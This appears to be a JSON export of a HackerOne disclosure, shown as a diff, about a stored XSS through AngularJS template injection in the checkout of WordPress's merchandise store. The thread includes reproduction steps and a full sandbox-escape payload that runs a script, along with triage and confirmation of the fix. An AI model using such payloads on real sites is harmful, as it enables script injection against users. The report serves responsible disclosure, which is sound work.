@@ -1,0 +1,812 @@
+{
+    "id": 230232,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzAyMzI=",
+    "url": "https://hackerone.com/reports/230232",
+    "title": "Stored self-XSS in mercantile.wordpress.org checkout",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "low",
+    "readable_substate": "Resolved",
+    "created_at": "2017-05-20T13:40:03.593Z",
+    "submitted_at": "2017-05-20T13:40:03.593Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "eidelweiss",
+        "url": "/eidelweiss",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 55,
+        "url": "https://hackerone.com/wordpress",
+        "handle": "wordpress",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "WordPress",
+            "twitter_handle": "wordpress",
+            "website": "https://wordpress.org/",
+            "about": "Beautiful sites of any kind."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2017-07-14T06:49:11.979Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2017-06-14T06:49:05.611Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hello Team,\n\n**Summary**\nafter i read this #221893 report, i try to find more security issue there, and i was surprise i found an RCE Via Template Injection. Since on that report i see `ng-bindable` word, its possible the site also effect by RCE.\n\n**Step To Reproduce**\n\n1. open https://mercantile.wordpress.org and sign up for account.\n2. after finish sign up navigate to `https://mercantile.wordpress.org/my-account/edit-account/` to field your first and last name\n3. now navigate again to `https://mercantile.wordpress.org/my-account/edit-address/`\n4. field all form for Billing Address with `{{1+1}}` except the `zip code` and field all form with `{{1==1}}` for the Shipping Address. and press save.\n\n{F186514}   \n\n5. now try to make an order by select any product till process or step to `https://mercantile.wordpress.org/checkout/`\n6. there you will see, the code `{{1+1}}` that we have field in the form for address bellow is execute as `2` automaticly there. and the `{{1==1}}` in shipping address will be execute as `true` .\n\n{F186513}\n\nThis is a vulnerability about Flask Template Engine(Jinja2) Injection or Angular JS Template Injection , more detail can be seen in these blogs for your Reference:\n\n1. https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/\n2. https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/\n3. http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html\n\nBest Regards,\n",
+    "weakness": {
+        "id": 62,
+        "name": "Cross-site Scripting (XSS) - Stored"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 186513,
+            "file_name": "merchantile_saved_address_changes_when_check_out.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/513/40d93c51caad29ec62be2d5ee1b421412948ca0d/merchantile_saved_address_changes_when_check_out.jpg?response-content-disposition=attachment%3B%20filename%3D%22merchantile_saved_address_changes_when_check_out.jpg%22%3B%20filename%2A%3DUTF-8%27%27merchantile_saved_address_changes_when_check_out.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080126Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cd0f2410af13c5eef32cf4c6b5f9cd366b108b045bf70681302e5df3789fd929",
+            "file_size": 81732,
+            "type": "image/jpeg"
+        },
+        {
+            "id": 186514,
+            "file_name": "merchantile_saved_address.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/514/2a826b94e9179c74c4415379d7121c068f2522c4/merchantile_saved_address.jpg?response-content-disposition=attachment%3B%20filename%3D%22merchantile_saved_address.jpg%22%3B%20filename%2A%3DUTF-8%27%27merchantile_saved_address.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080126Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58a9df54efd9d7a0f31e9e49ad744a4c7f119c530dc60778e386b67ded306f85",
+            "file_size": 84410,
+            "type": "image/jpeg"
+        }
+    ],
+    "allow_singular_disclosure_at": "2017-07-14T06:49:05.673Z",
+    "allow_singular_disclosure_after": -193281140.45107454,
+    "singular_disclosure_allowed": true,
+    "vote_count": 14,
+    "voters": [
+        "bl4de",
+        "jon_bottarini",
+        "r3y",
+        "eveeez",
+        "h33t",
+        "mr_r3boot",
+        "zerotoone",
+        "japz",
+        "silv3rpoision",
+        "codertom",
+        "and 4 more..."
+    ],
+    "severity": {
+        "rating": "low",
+        "author_type": "Team"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 1688657,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-20T14:58:26.146Z",
+            "updated_at": "2017-05-20T14:58:26.146Z",
+            "additional_data": {
+                "old_title": "RCE via Template Injection in mercantile.wordpress.org",
+                "new_title": "Template Injection in mercantile.wordpress.org"
+            },
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688705,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportVulnerabilityTypesUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-20T15:26:56.419Z",
+            "updated_at": "2018-02-28T13:11:07.606Z",
+            "additional_data": {
+                "added_weaknesses": [
+                    {
+                        "id": 62,
+                        "name": "Cross-site Scripting (XSS) - Stored"
+                    }
+                ],
+                "removed_weaknesses": [
+                    {
+                        "id": 70,
+                        "name": "Code Injection"
+                    }
+                ]
+            },
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688706,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-20T15:27:12.957Z",
+            "updated_at": "2017-05-20T15:27:12.957Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "Low",
+                "old_severity_id": null,
+                "new_severity_id": 43579
+            },
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688721,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hi, thanks for the report. I don't think this is RCE, since it's just client-side. That's typically classified as XSS.\n\nIn this case, the payloads you've provided only demonstrate basic expression evaluation. If I understand Angular correctly, that doesn't necessarily mean there's a vulnerability that can lead to XSS.\n\nAre you able to provide a payload that results in XSS?",
+            "automated_response": false,
+            "created_at": "2017-05-20T15:38:39.520Z",
+            "updated_at": "2017-05-20T15:38:39.520Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688767,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "hello sur @iandunn ,\n\nfirst, thanks for your fast response..yes i do agree its just template injection..\n\nbut finally i found the payload that can lead to stored XSS , this payload can be used and or work in FF and Chrome\n\n```\n{{     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;     c.$apply=$apply;c.$eval=b;op=$root.$$phase;     $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;     C=c.$apply(c);$root.$$phase=op;$root.$digest=od;     B=C(b,c,b);$evalAsync(\"     astNode=pop();astNode.type='UnaryExpression';     astNode.operator='(window.X?void0:(window.X=true,alert(document.domain)))+';     astNode.argument={type:'Identifier',name:'foo'};     \");     m1=B($$asyncQueue.pop().expression,null,$root);     m2=B(C,null,m1);[].push.apply=m2;a=''.sub;     $eval('a(b.c)');[].push.apply=a; }}\n```\n   \n{F186571}\n\n\n\nBest Regards,\n",
+            "automated_response": false,
+            "created_at": "2017-05-20T16:11:40.138Z",
+            "updated_at": "2017-05-20T16:26:36.168Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 186571,
+                    "filename": "mercantile_xss.jpg",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/571/5c2afa9f6b73b363ffc5ad2661fcae84dff28333/mercantile_xss.jpg?response-content-disposition=attachment%3B%20filename%3D%22mercantile_xss.jpg%22%3B%20filename%2A%3DUTF-8%27%27mercantile_xss.jpg&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080126Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d19d67a0375a191200238dc9e44d789b81ab21fcc806ee6b0ccf2117335f501a"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688803,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thanks, I was able to reproduce XSS with that payload. We'll get started on a fix, and keep you updated on progress.",
+            "automated_response": false,
+            "created_at": "2017-05-20T16:33:52.932Z",
+            "updated_at": "2017-05-20T16:33:52.932Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688805,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-20T16:34:46.616Z",
+            "updated_at": "2017-05-20T16:34:46.616Z",
+            "additional_data": {
+                "old_title": "Template Injection in mercantile.wordpress.org",
+                "new_title": "Stored self-XSS in mercantile.wordpress.org checkout"
+            },
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688816,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "You are welcome sir @iandunn  , and thank you for confirming, am really respect and two thumbs up for your fast response.",
+            "automated_response": false,
+            "created_at": "2017-05-20T16:42:28.536Z",
+            "updated_at": "2017-05-20T16:42:28.536Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688829,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "anyway sir, i just don't think its self stored, just in my opinion..how if i complete the order ? i will get full end point URL to the order to check the status right (just like shopify) ? if yes its mean every time i visit (or anyone visit)  the end point URL for the order the xss will trigger i guess.. so this one is stored not self stored.\n\nCorrect me if am wrong sir.",
+            "automated_response": false,
+            "created_at": "2017-05-20T16:51:52.985Z",
+            "updated_at": "2017-05-20T16:51:52.985Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1688830,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-20T16:53:09.678Z",
+            "updated_at": "2017-05-20T16:53:09.678Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 230242
+            },
+            "actor": {
+                "username": "ysx",
+                "cleared": false,
+                "verified": false,
+                "url": "/ysx",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1689007,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-20T18:45:27.398Z",
+            "updated_at": "2017-05-20T18:45:27.398Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 230281
+            },
+            "actor": {
+                "username": "0xhomeless",
+                "cleared": false,
+                "verified": false,
+                "url": "/0xhomeless",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/rVq33VvomK7ieJYBohzxNkrz/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1689022,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "--update--\n\ni have an suggestion how to fix this one i think sir, simple limit to max 100 character, only a-A, 0-9 and `.` (dot) allowed and or do not allow any special / HTML char like in first and last name field/form.",
+            "automated_response": false,
+            "created_at": "2017-05-20T18:54:49.517Z",
+            "updated_at": "2017-05-20T18:56:01.366Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1693065,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for the suggestion :)\n\nI guess technically it's not limited to only the user who enters it, but it's definitely a mitigating factor.",
+            "automated_response": false,
+            "created_at": "2017-05-22T21:04:28.467Z",
+            "updated_at": "2017-05-22T21:04:28.467Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1697507,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello sir @iandunn ,\n\ni just test this today, and i confirm this one has been fix.. even `{{1+1}}` will not shown as `2` , and the payload for xss also not working at check out anymore now.\n\n{F187676}",
+            "automated_response": false,
+            "created_at": "2017-05-24T11:38:28.753Z",
+            "updated_at": "2017-05-24T11:38:28.753Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1697619,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-05-24T12:47:22.267Z",
+            "updated_at": "2017-05-24T12:47:22.267Z",
+            "actor": {
+                "username": "0xhomeless",
+                "cleared": false,
+                "verified": false,
+                "url": "/0xhomeless",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/rVq33VvomK7ieJYBohzxNkrz/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/0xhomeless",
+                "username": "0xhomeless"
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1698702,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Yeah, we've deployed some partial fixes already, but we're still in the process of refining some of the fixes, and doing more testing and hardening. ",
+            "automated_response": false,
+            "created_at": "2017-05-24T19:02:59.451Z",
